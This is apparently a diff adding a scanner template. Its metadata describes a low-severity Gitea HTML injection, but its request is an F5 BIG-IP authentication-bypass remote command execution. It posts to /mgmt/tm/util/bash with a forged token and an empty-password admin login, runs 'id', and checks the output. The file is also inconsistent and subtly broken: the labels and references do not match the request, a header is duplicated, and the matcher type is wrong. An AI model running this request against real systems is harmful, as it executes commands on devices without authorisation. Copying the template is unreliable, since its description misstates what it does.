@@ -1,0 +1,38 @@
+id: 1388-f5-bigIp
+info:
+  name: gitea html injection
+  author: osamahamad
+  severity: low
+  description: partial xss
+  tags: gitea,custom
+  reference:
+    - https://blog.gitea.io/2020/09/gitea-1.12.4-is-released/
+    - https://github.com/go-gitea/gitea/pull/12610
+    - https://github.com/go-gitea/gitea/pull/12612
+
+requests:
+  - raw:
+      - |
+        POST /mgmt/tm/util/bash HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 58
+        Connection: Keep-Alive
+        Content-Length: 58
+        Cache-Control: max-age=0
+        X-F5-Auth-Token: a
+        Authorization: Basic YWRtaW46
+
+        {
+        "command":"run",
+        "utilCmdArgs":"-c id"
+        }
+
+    redirects: true
+    max-redirects: 3
+    matchers-condition: or
+    matchers:
+      - type: regex
+        words:
+          - "uid"
+          - "commandResult"
+        part: body
